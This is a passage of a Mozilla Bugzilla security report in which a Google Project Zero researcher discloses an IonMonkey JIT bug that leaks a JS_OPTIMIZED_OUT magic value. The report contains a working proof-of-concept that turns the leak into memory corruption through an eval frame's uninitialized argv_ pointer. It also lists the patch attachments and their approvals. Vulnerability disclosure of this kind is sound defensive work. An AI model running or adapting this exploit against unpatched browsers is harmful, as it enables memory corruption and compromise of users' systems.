             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (3 files, 1 obsolete file)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9048557">(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.</a>
        </div>
        <div>
            <a href="#c6" class="attach-time activity-ref"><span class="rel-time" title="2019-03-05 09:02 PST" data-time="1551805335">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_422187" ><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c18"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1551966715"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_280903" ><span class="fn">abillings</span>
</div>:
              <a href="#c9"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1551888082"
            >
              sec-approval+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9048557&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9048557">Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9049131">Bug 1532599 - Force expected crashes on unexpected magic values.</a>
        </div>
        <div>
            <a href="#c13" class="attach-time activity-ref"><span class="rel-time" title="2019-03-07 03:11 PST" data-time="1551957092">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_422187" ><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#a200475_75935"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1551966832"
            >
              approval-mozilla-esr60+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9049131&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9049131">Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9049207">Bug 1532599 - Prevent DepthFirstSearchUse from eagerly marking Phi as unused.</a>
        </div>
        <div>
            <a href="#c16" class="attach-time activity-ref"><span class="rel-time" title="2019-03-07 07:33 PST" data-time="1551972781">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_422187" ><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9049207&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9049207">Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9050674">Bug 1532599 - Branch Pruning: Flag all Phi loops as used.</a>
        </div>
        <div>
            <a href="#c23" class="attach-time activity-ref"><span class="rel-time" title="2019-03-13 09:12 PDT" data-time="1552493530">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_422187" ><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_24572" ><span class="fn">pascalc</span>
</div>:
              <a href="#c34"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1553609516"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_24572" ><span class="fn">pascalc</span>
</div>:
              <a href="#c34"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1553609516"
            >
              approval-mozilla-release-</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_280903" ><span class="fn">abillings</span>
</div>:
              <a href="#c27"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1552917856"
            >
              sec-approval+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9050674&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9050674">Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="s0hSEg8b6ZLnqKviEwe5w8Ua8YfxvZjxezWrImqn1zy2JQ9r">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="13964415" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_634439" ><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_634439" ><a class="email " href="/user_profile?user_id=634439" > <span class="fna">Samuel Groß</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 04:08 PST" data-time="1551787701">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-0" data-comment-id="13964415" data-ismarkdown="true" ><p>IonMonkey can, during a bailout, leak an internal JS_OPTIMIZED_OUT magic value to the running script. This magic value can then be used to achieve memory corruption.</p>
<h1>Prerequisites</h1>
<h2>Magic Values</h2>
<p>Spidermonkey represents JavaScript values with the C++ type <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L276" rel="nofollow">JS::Value</a>, which is a NaN-boxed value that can encode a variety of different <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L53" rel="nofollow">types</a> such as doubles, string pointers, integers, or object pointers. Besides the types available in JavaScript, JS::Value can also store <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L191" rel="nofollow">special (&quot;magic&quot;)</a> values for various internal purposes. For example, JS_ELEMENTS_HOLE is used to represent holes in arrays, and JS_OPTIMIZED_ARGUMENTS represents the <code>arguments</code> object during a function call (so that no actual memory allocation is required for it).</p>
<h2>Branch Pruning</h2>
<p>IonMonkey (Spidermonkey&#39;s JIT engine) represents JavaScript code as a control-flow graph (CFG) of MIR (mid-level IR) instructions. When starting to compile a function, IonMonkey first translates the bytecode to MIR, keeping the same CFG. Afterwards, it tries to remove subtrees in the CFG that appear to not be used in order to save compilation time and potentially improve the result of various optimizations performed later. As an example, consider the following code, and assume further that in all previous executions only the if branch had been taken:</p>
<pre><code>if (cond_that_has_always_been_true) {
    // do something
} else {
    // do something else
}
</code></pre>
<p>In this case, branch pruning would likely decide to discard the else branch entirely and instead replace it with a bailout instruction to bailout to the baseline JIT should the branch ever be taken:</p>
<pre><code>if (cond_that_has_always_been_true) {
    // do something
} else {
    bailout();      // will continue execution in baseline JIT
}
</code></pre>
<h2>Phi Elimination</h2>
<p>IonMonkey&#39;s MIR uses static single assignment (SSA) form. In SSA form, every variable is assigned exactly once. Reassignments of variables on different branches in the CFG are handled with special Phi instructions. Consider the following example:</p>
<pre><code>var x;
if (c) {
    x = 1337;
} else {
    x = 1338;
}
print(x);
</code></pre>
<p>After translation to SSA form it would look something like this:</p>
<pre><code>if (c) {
    x1 = 1337;
} else {
    x2 = 1338;
}
x3 = Phi(x1, x2);
print(x3);
</code></pre>
<p>Phi Elimination is an optimization pass that tries to remove Phi instructions that are either redundant or unobservable (which frequently appear as result of SSA conversion and various optimizations). Quoting from the <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L1382" rel="nofollow">source code</a>:</p>
<pre><code>// Eliminates redundant or unobservable phis from the graph.  A
// redundant phi is something like b = phi(a, a) or b = phi(a, b),
// both of which can be replaced with a.  An unobservable phi is
// one that whose value is never used in the program.
</code></pre>
<p>Unobservalbe Phis are then replaced a special value, <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonTypes.h#L447" rel="nofollow">MagicOptimizedOut</a>. In case of a bailout from the JIT, such an optimized-out value will be materialized as a <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L223" rel="nofollow">JS_OPTIMIZED_OUT</a> JS magic value. This should not be observable by script since the compiler was able to prove that the variable is never used. Spidermonkey can, however, not simply leave the slot for an optimized-out variable uninitialized as e.g. the garbage collector expects a valid JS::Value in it.</p>
<p>Phi elimination can lead to problems in combination with branch pruning. Consider the following example:</p>
<pre><code>var only_used_in_else_branch = ...;
if (cond_that_has_always_been_true) {
    // do something, but don&#39;t use only_used_in_else_branch
} else {
    // do something else and use only_used_in_else_branch
}
</code></pre>
<p>Here again, branch pruning might decide to remove the else branch, in which case no use of the variable remains. As such, it would be replaced by a magic JS constant (JS_OPTIMIZED_OUT) in the JIT. Later, if the else branch was actually taken, the JIT code would perform a bailout and try to restore the variable. However, as it has been removed, it would now (incorrectly) restore it as JS_OPTIMIZED_OUT magic and continue using it in the baseline JIT, where it could potentially be observed by the executing script. To avoid this, branch pruning marks SSA variables that are used in removed blocks as <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/MIR.h#L129" rel="nofollow">&quot;useRemoved&quot;</a>, in which case the variables will <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L1330" rel="nofollow">not be optimized out</a>.</p>
<h1>Bug Description</h1>
<p>While fuzzing Spidermonkey, I encountered the following sample which crashes Spidermonkey built from the current release branch:</p>
<pre><code>function poc() {
    const x = &quot;adsf&quot;;
    for (let v7 = 0; v7 &lt; 2; v7++) {
        function v8() {
            let v13 = 0;
            do {
                v13++;
            } while (v13 &lt; 1200000);
        }
        const v15 = v8();
        for (let v25 = 0; v25 &lt; 100000; v25++) {
            if (x) {
            } else {
                const v26 = {get:v8};
                for (let v30 = 0; v30 &lt; 1000; v30++) { }
            }
        }
    }
}
poc();
</code></pre>
<p>It appears what is happening here is roughly the following:</p>
<p>At the beginning of JIT compilation (somewhere in one of the inner loops), IonMonkey produces the following simplified CFG (annotated with the different SSA variables for <code>x</code>):</p>
<pre><code>       +-------+
       |   0   +-----+
       | Entry |     |
       +-------+     |
   x1 = &quot;asdf&quot;       v
                 +-----------+
                 |     1     |
+---------------&gt;| Loop Head |
|                +--+--------+
|                   |  x2 = Phi(x1, x5)
|                   +--------+
|                            v
|   +-----------+     +------------+
|   |     3     |     |    2...    |
|   | OSR Entry |     | Inlined v8 |
|   +-+---------+     +----------+-+
|     | x3 = osrval(&#39;x&#39;)         |
|     +---------+     +----------+
|               v     v
|           +-------------+
|           |      4      |
|           |    Merge    |
|           +-----------+-+
|      x4 = Phi(x3, x2) |
|                       v
|           +-------------+
|           |    5...     |
+-----------+ Inner Loop  |
            +-------------+
          x5 = Phi(x4, ..); use(x5);
</code></pre>
<p>Since the function is already executing in the baseline JIT, the JIT code compiled by IonMonkey will likely be entered via OSR at block 3 in the middle of the outer loop.</p>
<p>After producing the initial MIR code, IonMonkey performs branch pruning. During branch pruning, IonMonkey inspects the hit count of the bytecode (and performs some more heuristics), and decides that block 3 (or really the exit from the loop in v8) should be pruned and replaced with a bailout to the baseline JIT. The CFG then looks something like this:</p>
<pre><code>       +-------+
       |   0   +-----+
       | Entry |     |
       +-------+     |
   x1 = &quot;asdf&quot;       v
                 +-----------+
                 |     1     |
+---------------&gt;| Loop Head |
|                +--+--------+
|                   |  x2 = Phi(x1, x5)
|                   +--------+
|                            v
|   +-----------+     +------------+
|   |     3     |     |    2...    |
|   | OSR Entry |     | Inlined v8 |
|   +-+---------+     +------------+
|     | x3 = osrval(1)
|     +---------+        !! branch pruned !!
|               v
|           +-------------+
|           |      4      |
|           |    Merge    |
|           +-----------+-+
|      x4 = Phi(x3)     |
|                       v
|           +-------------+
|           |    5...     |
+-----------+ Inner Loop  |
            +-------------+
          x5 = Phi(x4, ..); use(x5);
</code></pre>
<p>Since there was no use of x2 in the removed code, x2 is not marked as &quot;use removed&quot;. However, when removing the branch 2 -&gt; 4, IonMonkey also removed x2 as input to the Phi for x4 as there is no longer a path between block 1 and block 4. This removal of a use without setting the useRemoved flag then leads to problems later on, in particular during Phi Elimination, which changes the code to the following:</p>
<pre><code>       +-------+
       |   0   +-----+
       | Entry |     |
       +-------+     |
   x1 = &quot;asdf&quot;       v
                 +-----------+
                 |     1     |
+---------------&gt;| Loop Head |
|                +--+--------+
|                   |  x2 = OPTIMIZED_OUT
|                   +--------+
|                            v
|   +-----------+     +------------+
|   |     3     |     |    2...    |
|   | OSR Entry |     | Inlined v8 |
|   +-+---------+     +------------+
|     | x3 = osrval(1)
|     +---------+        !! branch pruned !!
|               v
|           +-------------+
|           |      4      |
|           |    Merge    |
|           +-----------+-+
|      x4 = Phi(x3)     |
|                       v
|           +-------------+
|           |    5...     |
+-----------+ Inner Loop  |
            +-------------+
          x5 = Phi(x4, ..); use(x5);
</code></pre>
<p>Here, Phi Elimination decided that x2 is an unobservable Phi as it is not used anywhere. As such, it replaces it with a MagicOptimizedOut value. However, when block 2 is executed in the JITed code, it will perform a bailout and restore <code>x</code> as JS_OPTIMIZED_OUT magic value. This is incorrect as the interpreter/baseline JIT will use <code>x</code> once it reaches the inner loop. There, <code>x</code> (now the optimized out magic) is used for a ToBoolean conversion, which crashes (in a non exploitable way) when reaching this code:</p>
<pre><code>JS_PUBLIC_API bool js::ToBooleanSlow(HandleValue v) {
  ...;
  MOZ_ASSERT(v.isObject());
  return !EmulatesUndefined(&amp;v.toObject());     // toObject will return an invalid pointer for a magic value
}
</code></pre>
<p>A similar scenario is described in <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L146" rel="nofollow">FlagPhiInputsAsHavingRemovedUses</a>, which is apparently supposed to prevent this from happening by marking x2 as useRemoved during branch pruning. However, in this case, FlagPhiInputsAsHavingRemovedUses fails to mark x2 as useRemoved as it concludes that x4 is also unused: basically, FlagPhiInputsAsHavingRemovedUses invokes <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L41" rel="nofollow">DepthFirstSearchUse</a> to figure out whether some Phi is used by performing a depth-first search over all uses. If it finds a non-Phi use, it returns true. In block 5 above (which are really multiple blocks), x4 is used by another Phi, x5, which is then used by a &quot;real&quot; instruction. DepthFirstSearchUse now visits x5 and puts it into the worklist. It then eventually finds x4 and:</p>
<ul>
<li>finds x5 as use, but as x5 is already in the worklist it <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L106" rel="nofollow">skips it</a></li>
<li>finds no other uses, and thus (incorrectly?) <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L135" rel="nofollow">marks x4 as unused</a></li>
</ul>
<p>As such, x2 is later on not marked as useRemove since its only use (x4) appears to be unused anyways.</p>
<h1>Exploitation</h1>
<p>It is possible get a reference to the magic JS_OPTIMIZED_OUT value by changing the body of the inner for loop to something like this:</p>
<pre><code>    for (let v25 = 0; v25 &lt; 100000; v25++) {
        // Should never be taken, but will be after triggering the bug (because both v3 and v1
        // will be a JS_OPTIMIZED_OUT magic value).
        if (v3 === v1) {
            let magic = v3;
            console.log(&quot;Magic is happening!&quot;);
            // do something with magic
            return;
        }
        if (v1) {
        } else {
            const v26 = {get:v8};
            for (let v30 = 0; v30 &lt; 1000; v30++) { }
        }
    }
</code></pre>
<p>Afterwards, the magic value will be stored in a local variable and can be freely used. What remains now is a way to use the magic value to cause further misbehaviour in the engine.</p>
<p>Spidermonkey uses different magic values in various places. These places commonly check for the existence of some specific magic value by calling <code>.isMagic(expectedMagicType)</code> on the value in question. For example, to check for the magic hole element, the code would invoke <code>elem.isMagic(JS_ELEMENTS_HOLE)</code>. The implementation of <code>isMagic</code> is shown below:</p>
<pre><code>bool isMagic(JSWhyMagic why) const {
  MOZ_ASSERT_IF(isMagic(), s_.payload_.why_ == why);
  return isMagic();
}
</code></pre>
<p>Interestingly, this way of implementing it makes it possible to supply a different magic value than the expected one while still causing this function to return true, thus making the caller believe that it has the right magic value. As such, the JS_OPTIMIZED_OUT magic value can, in many cases, be used as any other magic value in the code.</p>
<p>One interesting use of magic values is JS_OPTIMIZED_ARGUMENTS, representing the <code>arguments</code> object. The idea is that e.g.</p>
<pre><code>function foo() {
    print(arguments[0]);
}
</code></pre>
<p>Gets compiled to bytecode like this:</p>
<pre><code>push JS_OPTIMIZED_ARGUMENTS
LoadElem 0
call print
</code></pre>
<p>The special handling for the magic value is then performed here:</p>
<pre><code>static bool DoGetElemFallback(JSContext* cx, BaselineFrame* frame,
                              ICGetElem_Fallback* stub, HandleValue lhs,
                              HandleValue rhs, MutableHandleValue res) {
  // ...

  bool isOptimizedArgs = false;
  if (lhs.isMagic(JS_OPTIMIZED_ARGUMENTS)) {
    // Handle optimized arguments[i] access.
    if (!GetElemOptimizedArguments(cx, frame, &amp;lhsCopy, rhs, res,
                                   &amp;isOptimizedArgs)) {
      return false;
    }

  // ...
</code></pre>
<p>Which eventually ends up in:</p>
<pre><code>inline Value&amp; InterpreterFrame::unaliasedActual(
  unsigned i, MaybeCheckAliasing checkAliasing) {
  MOZ_ASSERT(i &lt; numActualArgs());
  MOZ_ASSERT_IF(checkAliasing, !script()-&gt;argsObjAliasesFormals());
  MOZ_ASSERT_IF(checkAliasing &amp;&amp; i &lt; numFormalArgs(),
                !script()-&gt;formalIsAliased(i));
  return argv()[i];         // really is just argv_[i];
}
</code></pre>
<p>An <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/vm/Stack.h#L85" rel="nofollow">InterpreterFrame</a> is an object representing the invocation context of a JavaScript function.<br>
Basically, there are two types of InterpreterFrames: <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/vm/Stack-inl.h#L51" rel="nofollow">CallFrames</a>, which are used for regular function calls and thus have the <code>nactul_</code> (the number of arguments) and <code>argv_</code> (a pointer to the argument values) members initialized, and <a href="https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/vm/Stack.cpp#L35" rel="nofollow">ExecuteFrames</a>, which are e.g. used for eval()ed code. Interestingly, ExecuteFrames leave <code>nactual_</code> and <code>argv_</code> uninitialized, which is normally fine as code would never access these fields in an ExecuteFrame. However, by having a reference to a magic value, it now becomes possible to trick the engine into believing that whatever frame is currently active is a CallFrame and thus has a valid <code>argv_</code> pointer by loading an element from the magic value (<code>magic[i]</code> in JS). Conveniently, InterpreterFrames are allocated by a bump allocator, used solely for the interpreter stack. As such, the allocations are very deterministic and it is easily possible to overlap the uninitialized member with any other data that is stored on the interpreter stack, such as local variables of functions.</p>
<p>The following PoC (tested against a local Spidermonkey build and Firefox 65.0.1) demonstrates this. It will first trigger the bug to leak the magic JS_OPTIMIZED_OUT value. Afterwards, it puts a controlled value (0x414141414141 in binary) on the interpreter stack (in <code>fill_stack</code>), then uses the magic value from inside an eval frame of which the <code>argv_</code> pointer overlaps with the controlled value. Spidermonkey will then assume that the current frame must be a FunctionFrame and treat the value as an <code>argv_</code> pointer, thus crashing at 0x414141414141.</p>
<pre><code>// This function uses roughly sizeof(InterpreterFrame) + 14 * 8 bytes of interpreter stack memory.
function fill_stack() {
    // Use lot&#39;s of stack slots to increase the allocation size of this InterpreterFrame.
    var v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13;
    // Will overlap with the argv_ pointer in the InterpreterFrame for the call to eval.
    var v14 = 3.54484805889626e-310;
}

// This function uses roughly sizeof(InterpreterFrame) bytes of interpreter stack memory. The inner
// call to eval will get its own InterpreterFrame, which leaves the argv_ pointer uninitialized
// (since it&#39;s an eval frame). However, due to having a magic value here, it is possible to trick
// the interpreter into accessing argv_ (because it assumes that the magic value represents an
// `arguments` object). The argv_ pointer of the inner frame will then overlap with one of the
// variables of the previous function, and is thus fully controllable.
function trigger(magic) {
    eval(`magic[0]`);
}

// Invoke the two functions above to achieve memory corruption given a magic JS::Value.
function hax(magic) {
    fill_stack();
    trigger(magic);
}

function pwn() {
    const v1 = &quot;adsf&quot;;
    const v3 = &quot;not_asdf&quot;;
    for (let v7 = 0; v7 &lt; 2; v7++) {
        function v8() {
            let v13 = 0;
            do {
                v13++;
            } while (v13 &lt; 1200000);
            // If the previous loop runs long enough, IonMonkey will JIT compile v8 and enter the
            // JITed code via OSR. This will leave the hitCount for the loop exit in the interpreter
            // at 0 (because the exit is taken in JITed code). This in turn will lead to IonMonkey
            // pruning the loop exit when compiling pwn() (with inlined v8), as its heuristics
            // suggest that the branch is never taken (hitCount == 0 and a few more). This will then
            // lead to the incorrect removal of Phi nodes, and ultimately the leaking of a
            // JS_OPTMIZED_OUT magic value to the baseline JIT, where it is observable for the
            // current script.
        }
        const v15 = v8();
        for (let v25 = 0; v25 &lt; 100000; v25++) {
            // Should never be taken, but will be after triggering the bug (because both v3 and v1
            // will be a JS_OPTIMIZED_OUT magic value).
            if (v3 === v1) {
                let magic = v3;
                console.log(&quot;Magic is happening!&quot;);
                hax(magic);
                return;
            }
            if (v1) {
            } else {
                const v26 = {get:v8};
                for (let v30 = 0; v30 &lt; 1000; v30++) { }
            }
        }
    }
}
pwn();
</code></pre>
<p>Please note: this bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made broadly available (whichever is earlier), the bug report will become visible to the public.</p>
<p>With any fix, please give credit for identifying the vulnerability to Samuel Groß of Google Project Zero.</p>
</div></div><div class="change-set" id="a81_159069"><div class="change" id="aa81_159069">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a81_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a81_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a81_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a81_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a81_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 04:09 PST" data-time="1551787782">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: firefox-core-security &rarr; javascript-core-security</div><div class="change">Component: Security &rarr; JavaScript Engine: JIT</div><div class="change">Product: Firefox &rarr; Core</div></div></div><div class="change-set" id="c1"><div class="comment" data-id="13964420" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_634439" id="a81_159069"><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_634439" id="a81_159069"><a class="email " href="/user_profile?user_id=634439" > <span class="fna">Samuel Groß</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 04:13 PST" data-time="1551788011">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
